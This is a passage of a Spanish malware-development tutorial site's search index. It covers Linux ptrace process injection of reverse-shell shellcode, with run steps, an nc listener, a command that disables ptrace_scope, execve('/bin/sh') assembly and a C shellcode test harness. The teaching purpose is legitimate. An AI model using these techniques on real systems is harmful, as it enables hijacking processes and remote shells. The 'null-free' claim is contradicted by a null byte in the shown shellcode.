\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n\u2502  \u2502 ...                                                 \u2502    \u2502\n\u2502  \u2502 [RIP original] \u2192 instrucci\u00f3n donde se detuvo        \u2502\u25c4\u2500\u2500\u2500\u2524 Restaurado\n\u2502  \u2502 ...                                                 \u2502    \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n\u2502                                                             \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                             \u2502\n\u2502  MMAP Region (4096 bytes, RWX)                              \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n\u2502  \u2502 +0x000: shellcode _start (fork)                     \u2502\u25c4\u2500\u2500\u2500\u2524 Nuevo RIP\n\u2502  \u2502 +0x008: ...                                         \u2502    \u2502\n\u2502  \u2502 +0x010: c\u00f3digo padre (jmp a retorno)                \u2502    \u2502\n\u2502  \u2502 +0x020: .child (setsid, socket, connect...)         \u2502    \u2502\n\u2502  \u2502 +0x080: .dup2 loop                                  \u2502    \u2502\n\u2502  \u2502 +0x0A0: execve(\"/bin/sh\")                           \u2502    \u2502\n\u2502  \u2502 ...                                                 \u2502    \u2502\n\u2502  \u2502 +0xFF8: RIP de retorno original                     \u2502\u25c4\u2500\u2500\u2500\u2524 Guardado aqu\u00ed\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n\u2502                                                             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#compilacion-y-uso","title":"Compilaci\u00f3n y uso","text":"<pre><code># Compilar el inyector\nnasm -f elf64 proc_inj.asm -o proc_inj.o\nld proc_inj.o -o proc_inj\n\n# Compilar el shellcode (para testing independiente)\nnasm -f elf64 proc_inj_rev_tcp.asm -o shell.o\nld shell.o -o shell\n\n# Encontrar PID del proceso objetivo\nps aux | grep &lt;nombre_proceso&gt;\n\n# Modificar el PID en proc_inj.asm (l\u00ednea: mov r15, &lt;PID&gt;)\n\n# Recompilar y ejecutar (requiere CAP_SYS_PTRACE o mismo UID)\n./proc_inj\n\n# En otra terminal: listener para la reverse shell\nnc -lvnp 4444\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#consideraciones-de-seguridad","title":"Consideraciones de seguridad","text":""},{"location":"research/malware-dev/ptrace-injection/#permisos-necesarios","title":"Permisos necesarios","text":"<p>Para que ptrace funcione, se debe cumplir al menos una de estas condiciones:</p> <ol> <li>El tracer tiene el mismo UID que el tracee.</li> <li>El tracer tiene la capability <code>CAP_SYS_PTRACE</code>.</li> <li>El tracer es root.</li> </ol>"},{"location":"research/malware-dev/ptrace-injection/#ptrace_scope-yama-lsm","title":"ptrace_scope (Yama LSM)","text":"<p>El archivo <code>/proc/sys/kernel/yama/ptrace_scope</code> controla restricciones adicionales:</p> Valor Comportamiento 0 Sin restricciones (cualquier proceso puede tracear a otro del mismo UID) 1 Solo procesos padres pueden tracear hijos (default en Ubuntu/Debian) 2 Solo procesos con CAP_SYS_PTRACE pueden tracear 3 Ptrace completamente deshabilitado <p>Para testing, puedes temporalmente:</p> <pre><code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#sobre-orig_rax","title":"Sobre orig_rax","text":"<p>Establecemos <code>orig_rax = -1</code> antes del DETACH. Si no lo hacemos y el proceso estaba en medio de una syscall interrumpible cuando lo adjuntamos, Linux podr\u00eda intentar reiniciar esa syscall autom\u00e1ticamente, causando comportamiento inesperado.</p> <p>Solo en entornos controlados</p> <p>Este c\u00f3digo es para fines educativos y de investigaci\u00f3n. Ejecutar \u00fanicamente en m\u00e1quinas virtuales o entornos de laboratorio propios. El uso indebido de estas t\u00e9cnicas es ilegal.</p> <p>Referencias</p> <ul> <li>ptrace(2) - Linux manual</li> <li>Syscall Table x86-64</li> <li>user_regs_struct - Linux source</li> <li>Yama LSM - ptrace_scope</li> </ul>"},{"location":"research/malware-dev/shellcode-basics/","title":"Shellcode Basics","text":"<p>Fundamentos de desarrollo de shellcode para Linux x86-64.</p>"},{"location":"research/malware-dev/shellcode-basics/#que-es-shellcode","title":"\u00bfQu\u00e9 es shellcode?","text":"<p>Shellcode es c\u00f3digo m\u00e1quina dise\u00f1ado para ser inyectado y ejecutado en el contexto de otro proceso.</p>"},{"location":"research/malware-dev/shellcode-basics/#caracteristicas","title":"Caracter\u00edsticas","text":"<ul> <li>Position Independent: no depende de direcciones fijas</li> <li>Null-free: evita bytes nulos (<code>0x00</code>)</li> <li>Peque\u00f1o: menor tama\u00f1o posible</li> </ul>"},{"location":"research/malware-dev/shellcode-basics/#syscall-en-x86-64","title":"Syscall en x86-64","text":"<p>En Linux x86-64, las syscalls se invocan con la instrucci\u00f3n <code>syscall</code>:</p> Registro Prop\u00f3sito <code>rax</code> N\u00famero de syscall <code>rdi</code> Argumento 1 <code>rsi</code> Argumento 2 <code>rdx</code> Argumento 3 <code>r10</code> Argumento 4 <code>r8</code> Argumento 5 <code>r9</code> Argumento 6"},{"location":"research/malware-dev/shellcode-basics/#execvebinsh","title":"execve(\"/bin/sh\")","text":"<pre><code>; Linux x86-64 execve(\"/bin/sh\")\n; nasm -f elf64 shell.asm -o shell.o\n; ld shell.o -o shell\n\nglobal _start\n\nsection .text\n_start:\n    ; Limpiar registros\n    xor rax, rax\n    xor rdx, rdx        ; envp = NULL\n    xor rsi, rsi        ; argv = NULL\n\n    ; Push \"/bin/sh\" a la pila\n    push rax            ; null terminator\n    mov rbx, 0x68732f6e69622f  ; \"/bin/sh\" en little-endian\n    push rbx\n\n    ; rdi = pointer a \"/bin/sh\"\n    mov rdi, rsp\n\n    ; execve(rdi, rsi, rdx)\n    mov al, 59          ; syscall number para execve\n    syscall\n</code></pre>"},{"location":"research/malware-dev/shellcode-basics/#extraer-bytes","title":"Extraer bytes","text":"<pre><code>objdump -d shell.o | grep -Po '\\s\\K[a-f0-9]{2}(?=\\s)' | sed 's/^/\\\\x/g' | tr -d '\\n'\n</code></pre>"},{"location":"research/malware-dev/shellcode-basics/#evitar-null-bytes","title":"Evitar null bytes","text":"<pre><code>; MAL - contiene null bytes\nmov rax, 0x3b           ; 48 c7 c0 3b 00 00 00\n\n; BIEN - sin null bytes  \nxor rax, rax\nmov al, 0x3b            ; 48 31 c0 b0 3b\n</code></pre>"},{"location":"research/malware-dev/shellcode-basics/#testear-shellcode","title":"Testear shellcode","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nunsigned char shellcode[] = \n    \"\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\x31\\xf6\"\n    \"\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\"\n    \"\\x68\\x00\\x53\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05\";\n\nint main() {\n    printf(\"Shellcode length: %zu\\n\", strlen(shellcode));\n\n    void (*sc)() = (void(*)())shellcode;\n    sc();\n\n    return 0;\n}\n</code></pre> <pre><code>gcc -z execstack -fno-stack-protector -o test test.c\n./test\n</code></pre> <p>Solo en entornos controlados</p> <p>Ejecutar shellcode solo en m\u00e1quinas virtuales o entornos de laboratorio.</p> <p>Referencias</p> <ul> <li>Syscall Table x86-64</li> <li>Shell-Storm Shellcode DB</li> </ul>"}]}